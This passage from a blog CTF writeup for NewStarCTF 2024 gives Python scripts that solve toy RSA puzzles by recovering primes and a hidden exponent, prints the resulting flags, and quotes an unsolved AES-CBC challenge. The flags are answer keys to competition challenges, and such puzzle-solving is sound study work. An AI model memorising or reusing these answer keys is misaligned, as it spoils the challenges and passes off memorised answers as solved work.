<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> mod_inverse</span><br><span class="line"></span><br><span class="line">p = <span class="number">11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133</span></span><br><span class="line">q = <span class="number">11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393</span></span><br><span class="line">r = <span class="number">12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371</span></span><br><span class="line">N = p * q * r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1 = <span class="number">8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451</span></span><br><span class="line">c2 = <span class="number">1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445</span></span><br><span class="line"></span><br><span class="line">phi_p = p - <span class="number">1</span></span><br><span class="line">d1 = mod_inverse(e, phi_p)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, p)</span><br><span class="line"></span><br><span class="line">phi_N = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line">d2 = mod_inverse(e, phi_N)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, N)</span><br><span class="line"></span><br><span class="line">m1_bytes = long_to_bytes(m1)</span><br><span class="line">m2_bytes = long_to_bytes(m2)</span><br><span class="line">flag = m1_bytes + m2_bytes</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>运行就能够得到flag了，为<code>flag&#123;Y0u_re4lly_kn0w_Euler_4nd_N3xt_Eu1er_is_Y0u!&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Code_p2DgDbj0B4.png"></p>
<h3 id="没e怎么玩？"><a href="#没e怎么玩？" class="headerlink" title="没e怎么玩？"></a>没e怎么玩？</h3><blockquote>
<p>公钥到处乱传，这下大家都能加密了——我不想把e告诉大家，只有聪明的宝宝才可以知道</p>
<p>【难度：简单】</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;flag&#123;*****&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">h1 = <span class="number">1</span>*p + <span class="number">1</span>*q + <span class="number">1</span>*r</span><br><span class="line">h2 = <span class="number">2</span>*p + <span class="number">3</span>*q + <span class="number">3</span>*r</span><br><span class="line">h3 = <span class="number">9</span>*p + <span class="number">9</span>*q + <span class="number">6</span>*r</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;hint_of_pqr=&quot;</span> , h1 , h2 , h3 )</span><br><span class="line"></span><br><span class="line">e = getPrime(<span class="number">64</span>)</span><br><span class="line">a_big_prime = getPrime( <span class="number">512</span> )</span><br><span class="line">hint = <span class="built_in">pow</span>(a_big_prime,e,<span class="number">2</span>**<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;big_prime is: &quot;</span> , a_big_prime )</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;hint is: &quot;</span> , hint )</span><br><span class="line"></span><br><span class="line">n = p*q*r</span><br><span class="line">c = <span class="built_in">pow</span>( m , e , n )</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;c=&quot;</span> , c )</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">hint_of_pqr= 31142735238530997044538008977536563192992446755282526163704097825748037157617958329370018716097695151853567914689441893020256819531959835133410539308633497 83244528500940968089139246591338465098116598400576450028712055615289379610182828415628469144649133540240957232351546273836449824638227295064400834828714760 248913032538718194100308575844236838621741774207751338576000867909773931464854644505429950530402814602955352740032796855486666128271187734043696395254816172 </span></span><br><span class="line"><span class="string">big_prime is:  10340528340717085562564282159472606844701680435801531596688324657589080212070472855731542530063656135954245247693866580524183340161718349111409099098622379</span></span><br><span class="line"><span class="string">hint is:  1117823254118009923270987314972815939020676918543320218102525712576467969401820234222225849595448982263008967497960941694470967789623418862506421153355571 </span></span><br><span class="line"><span class="string">c= 999238457633695875390868312148578206874085180328729864031502769160746939370358067645058746087858200698064715590068454781908941878234704745231616472500544299489072907525181954130042610756999951629214871917553371147513692253221476798612645630242018686268404850587754814930425513225710788525640827779311258012457828152843350882248473911459816471101547263923065978812349463656784597759143314955463199850172786928389414560476327593199154879575312027425152329247656310</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先浅浅的写几段代码，把题目给的方程解出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, Eq, solve</span><br><span class="line"></span><br><span class="line">p, q, r = symbols(<span class="string">&#x27;p q r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">eq1 = Eq(<span class="number">1</span>*p + <span class="number">1</span>*q + <span class="number">1</span>*r, <span class="number">31142735238530997044538008977536563192992446755282526163704097825748037157617958329370018716097695151853567914689441893020256819531959835133410539308633497</span>)</span><br><span class="line">eq2 = Eq(<span class="number">2</span>*p + <span class="number">3</span>*q + <span class="number">3</span>*r, <span class="number">83244528500940968089139246591338465098116598400576450028712055615289379610182828415628469144649133540240957232351546273836449824638227295064400834828714760</span>)</span><br><span class="line">eq3 = Eq(<span class="number">9</span>*p + <span class="number">9</span>*q + <span class="number">6</span>*r, <span class="number">248913032538718194100308575844236838621741774207751338576000867909773931464854644505429950530402814602955352740032796855486666128271187734043696395254816172</span>)</span><br><span class="line"></span><br><span class="line">solution = solve([eq1, eq2, eq3], (p, q, r))</span><br><span class="line"><span class="built_in">print</span>(solution)</span><br></pre></td></tr></table></figure>

<p>得到结果</p>
<table>
<thead>
<tr>
<th>p</th>
<th>10183677214652023044474780341271224480860741865271128462400237861954731862671046572481587003643951915319746511716779405224320633957652210335830783097185731</th>
</tr>
</thead>
<tbody><tr>
<td>q</td>
<td>10501863154525380899885393651734595340401622693414265402191855789807170977044584937255025740961595981958235238915269093897387769735490697411913603370485999</td>
</tr>
<tr>
<td>r</td>
<td>10457194869353593100177834984530743371730082196597132299112004173986134317902326819633405971492147254575586164057393393898548415838816927385666152840961767</td>
</tr>
</tbody></table>
<p>进而得到n为<code>1118371732112787903418346489449078880127023778708016096649855016901643516642180291022300035501171412055073735949284412598731736949716359134192953438758363513682501930485643681749944489845602193481814423227893712381256148117841115506286465981588616993739184910418884137625771473608912624633173817295646021794436158718988571029798542407300967100761668975428477818008241171856195208878653975471332648078437606620726521120367718955217258453677408306939312852506075323</code>，非常地大，而在RSA中，N为模数</p>
<p>再求一下e，根据题目给的信息，可写出以下代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> mod_inverse</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"></span><br><span class="line">a_big_prime = <span class="number">10340528340717085562564282159472606844701680435801531596688324657589080212070472855731542530063656135954245247693866580524183340161718349111409099098622379</span></span><br><span class="line">hint = <span class="number">1117823254118009923270987314972815939020676918543320218102525712576467969401820234222225849595448982263008967497960941694470967789623418862506421153355571</span></span><br><span class="line">modulus = <span class="number">2</span>**<span class="number">512</span></span><br><span class="line"></span><br><span class="line">e_value = discrete_log(modulus, hint, a_big_prime)</span><br><span class="line"><span class="built_in">print</span>(e_value)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到e的值为<code>18344052974846453963</code></p>
<p>进而可以开始解密，写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> mod_inverse</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(<span class="string">&quot;1118371732112787903418346489449078880127023778708016096649855016901643516642180291022300035501171412055073735949284412598731736949716359134192953438758363513682501930485643681749944489845602193481814423227893712381256148117841115506286465981588616993739184910418884137625771473608912624633173817295646021794436158718988571029798542407300967100761668975428477818008241171856195208878653975471332648078437606620726521120367718955217258453677408306939312852506075323&quot;</span>)</span><br><span class="line">e = <span class="number">18344052974846453963</span></span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&quot;999238457633695875390868312148578206874085180328729864031502769160746939370358067645058746087858200698064715590068454781908941878234704745231616472500544299489072907525181954130042610756999951629214871917553371147513692253221476798612645630242018686268404850587754814930425513225710788525640827779311258012457828152843350882248473911459816471101547263923065978812349463656784597759143314955463199850172786928389414560476327593199154879575312027425152329247656310&quot;</span>)</span><br><span class="line">p = <span class="number">10183677214652023044474780341271224480860741865271128462400237861954731862671046572481587003643951915319746511716779405224320633957652210335830783097185731</span></span><br><span class="line">q = <span class="number">10501863154525380899885393651734595340401622693414265402191855789807170977044584937255025740961595981958235238915269093897387769735490697411913603370485999</span></span><br><span class="line">r = <span class="number">10457194869353593100177834984530743371730082196597132299112004173986134317902326819633405971492147254575586164057393393898548415838816927385666152840961767</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate phi(n)</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate private key d</span></span><br><span class="line">d = mod_inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the ciphertext</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert decrypted message to plaintext</span></span><br><span class="line">plaintext = <span class="built_in">bytearray</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]).decode()</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Code_bhPrq8ZlLh.png"></p>
<p>得到flag为<code>flag&#123;th1s_2s_A_rea119_f34ggg&#125;</code></p>
<h3 id="不用谢喵（未做出）"><a href="#不用谢喵（未做出）" class="headerlink" title="不用谢喵（未做出）"></a>不用谢喵（未做出）</h3><blockquote>
<p>——求求你帮我解密吧，我什么都会做的</p>
<p>——解好了，不用谢喵</p>
<p>【难度：简单】</p>
</blockquote>
<p>附件下载下来是Python代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">KEY = <span class="string">b&quot;fake_key_fake_ke&quot;</span></span><br><span class="line">FLAG = <span class="string">&quot;flag&#123;fake_flag_fake_flag&#125;&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c</span>):</span><br><span class="line">    AES_ECB = AES.new(KEY, AES.MODE_CBC)</span><br><span class="line">    decrypted = AES_ECB.decrypt(long_to_bytes(c))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    AES_CBC = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">    encrypted = AES_CBC.encrypt(FLAG.encode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;iv:&#x27;</span>,iv.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> iv.<span class="built_in">hex</span>() + encrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">c=encrypt()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;encrypt:&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;decrypt:&#x27;</span>,decrypt(<span class="built_in">int</span>(c,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#encrypt: f2040fe3063a5b6c65f66e1d2bf47b4cddb206e4ddcf7524932d25e92d57d3468398730b59df851cbac6d65073f9e138</span></span><br><span class="line"><span class="comment">#什么是AES啊😭，求求你帮我解密吧，我什么都会做的！！！！！😭</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">什么都会做？那就去学习一下AES吧……</span></span><br><span class="line"><span class="string">我这次就先给你解一下好了，不用谢喵</span></span><br><span class="line"><span class="string">decrypt: f9899749fec184d81afecd35da430bc394686e847d72141b3a955a4f6e920e7d91cb599d92ba2a6ba51860bb5b32f23b</span></span><br><span class="line"><span class="string">这对吗？哦不对不对，哦对的对的。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>说白了就是AES解密，看看AES解密的原理，然后电脑就送去修了，所以后面几周也没做……</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://github.com/GamerNoTitle">GamerNoTitle</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://bili33.top/posts/NewStarCTF2024-Writeup/">https://bili33.top/posts/NewStarCTF2024-Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/NewStarCTF/">NewStarCTF</a></div><div class="post_share"><div class="social-share" data-image="https://assets.bili33.top/img/NewStarCTF2024-Writeup/NewCTF.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://assets.bili33.top/img/Payments/WeChat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Payments/WeChat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://assets.bili33.top/img/Payments/AliPay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Payments/AliPay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/CTF-Wangding2024-Qinglong-Preliminary-round-Writeup/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-Wangding2024-Qinglong-Preliminary-round-Writeup/msedge_e1aHhr8sYb.png" onerror="onerror=null;src='https://assets.bili33.top/img/404/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">【Volcania】2024第四届“网鼎杯”网络安全大赛青龙组初赛Writeup</div></div></a></div><div class="next-post pull-right"><a href="/posts/MoeCTF2024-Writeup/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/MoeCTF-2024/MoeCTF2024.webp" onerror="onerror=null;src='https://assets.bili33.top/img/404/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">MoeCTF2024 个人Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/ADCTF2024-Writeup/" title="ADCTF2024 个人Writeup"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/msedge_5Mr1PCe98I.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-07</div><div class="title">ADCTF2024 个人Writeup</div></div></a></div><div><a href="/posts/BaseCTF2024-Writeup/" title="BaseCTF2024 个人Writeup"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/BaseCTF2024-Week1/msedge_uIfC9jDQCq.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-30</div><div class="title">BaseCTF2024 个人Writeup</div></div></a></div><div><a href="/posts/CTF-20220529/" title="2022年全国大学生信息安全竞赛创新实践能力赛初赛 —— 部分WriteUp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Top-img/NEKO-Hackers-Edited.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-29</div><div class="title">2022年全国大学生信息安全竞赛创新实践能力赛初赛 —— 部分WriteUp</div></div></a></div><div><a href="/posts/CTF-20220619/" title="2022年全国大学生信息安全竞赛创新实践能力赛 —— 复赛WriteUp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-20220619/Cover.jpg?download=true" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-19</div><div class="title">2022年全国大学生信息安全竞赛创新实践能力赛 —— 复赛WriteUp</div></div></a></div><div><a href="/posts/CTF-20220826-wangdingcup-qinglong/" title="2022网鼎杯青龙组——个人WriteUP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Top-img/NEKO-Hackers-Edited.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-26</div><div class="title">2022网鼎杯青龙组——个人WriteUP</div></div></a></div><div><a href="/posts/CTF-CCSSSC2025-National-Finals/" title="第十八届软件系统安全赛 CCSSSC 2025 全国总决赛复盘（旅行日记）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-CCSSSC2025-National-Finals/1748174171442.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-25</div><div class="title">第十八届软件系统安全赛 CCSSSC 2025 全国总决赛复盘（旅行日记）</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/AboutMe/logo-mini.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/link/Akarin.webp'" alt="avatar"/></div><div class="author-info__name">GamerNoTitle</div><div class="author-info__description">TECH OTAKUS SAVE THE WORLD</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">140</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">188</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><a id="card-info-btn" href="https://github.com/GamerNoTitle"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/GamerNoTitle" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://space.bilibili.com/44666814" target="_blank" title="bilibili"><i class="fas fa-tv"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a><a class="social-icon" href="mailto:GamerNoTitle@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content"><div align="center"><pre style="font-family: monospace; white-space: pre; line-height: 1 !important;">
.------.--------.---------.
| .=====================. |\
| | 7  3  5  5  6  0  8 | | |
| +=====================+ | |
|----------------------\\-. |
|    *   |      ^|^    || |\|
|   .-----------------.|| | |
|   |  1  |  2  |  3  ||| | |
|   |-----+-----+-----||| | |
|   |  4  |  5  |  6  ||| | |
|   |-----+-----+-----||| | |
|   |  7  |  8  |  9  ||| | |
|   |-----+-----+-----|// | |
|   |  *  |  0  |  #  |/  | |
|   +-----------------+   | |
|       |       |         | |
+-------+-------+---------+ |
\______\_______\_________+\/
</pre></div>
<div align="center"><span style="color: #e9b891;">gamernotitle</span>@<span style="color: #c5966d;">site_web</span> > <span style="color: #4a6d42;">./plant.sh</span><br>
Boom has been planted.
</div>
</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WhereIsFlag"><span class="toc-number">1.1.</span> <span class="toc-text">WhereIsFlag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Labyrinth"><span class="toc-number">1.2.</span> <span class="toc-text">Labyrinth</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decompress"><span class="toc-number">1.3.</span> <span class="toc-text">decompress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pleasingMusic"><span class="toc-number">1.4.</span> <span class="toc-text">pleasingMusic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%91%E6%8D%A2%E7%A0%81"><span class="toc-number">1.5.</span> <span class="toc-text">兑换码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%BA%AF%E6%B5%81%E4%BB%AA%E8%A7%81%E8%AF%81%E4%BC%8F%E7%89%B9%E5%8F%B0%E9%A3%8E"><span class="toc-number">1.6.</span> <span class="toc-text">用溯流仪见证伏特台风</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wireshark-checkin"><span class="toc-number">1.7.</span> <span class="toc-text">wireshark_checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wireshark-secret"><span class="toc-number">1.8.</span> <span class="toc-text">wireshark_secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E9%87%8C%E8%A1%8C%E9%97%B4%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">1.9.</span> <span class="toc-text">字里行间的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Herta%E2%80%99s-Study"><span class="toc-number">1.10.</span> <span class="toc-text">Herta’s Study</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E4%B9%9F%E7%8E%A9%E5%8E%9F%E7%A5%9E%E5%90%97%EF%BC%88%E6%9C%AA%E5%81%9A%E5%87%BA%EF%BC%89"><span class="toc-number">1.11.</span> <span class="toc-text">你也玩原神吗（未做出）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AD%E5%BF%83%E5%8A%A9%E4%BA%BA%E7%9A%84%E5%B0%8F%E6%98%8E%E5%90%8C%E5%AD%A6"><span class="toc-number">1.12.</span> <span class="toc-text">热心助人的小明同学</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E6%96%B0%E7%9A%84Kali-WSL%E4%B8%AD%E5%AE%89%E8%A3%85volatility2%E5%92%8Cmimikatz"><span class="toc-number">1.12.1.</span> <span class="toc-text">在新的Kali WSL中安装volatility2和mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Python2"><span class="toc-number">1.12.2.</span> <span class="toc-text">安装Python2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85volatility2"><span class="toc-number">1.12.3.</span> <span class="toc-text">安装volatility2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 